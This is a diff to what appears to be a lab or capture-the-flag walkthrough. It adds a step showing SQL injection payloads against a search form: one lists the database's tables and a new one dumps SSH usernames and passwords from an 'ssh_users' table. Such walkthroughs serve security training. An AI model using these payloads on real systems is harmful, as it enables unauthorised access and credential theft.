@@ -69,9 +69,14 @@ The sign-in page requires the following inputs:
 
 Attack the search form with an SQL injection, e.g. by querying all tables in the database:
 
-
 ```sql
 Llamaland' UNION SELECT type, name, name FROM sqlite_schema WHERE type = 'table' AND name NOT LIKE 'sqlite_%
+```
+
+Get SSH username and password:
+
+```sql
+Llamaland' UNION SELECT * FROM ssh_users --
 ```
 
 **SSH user:**
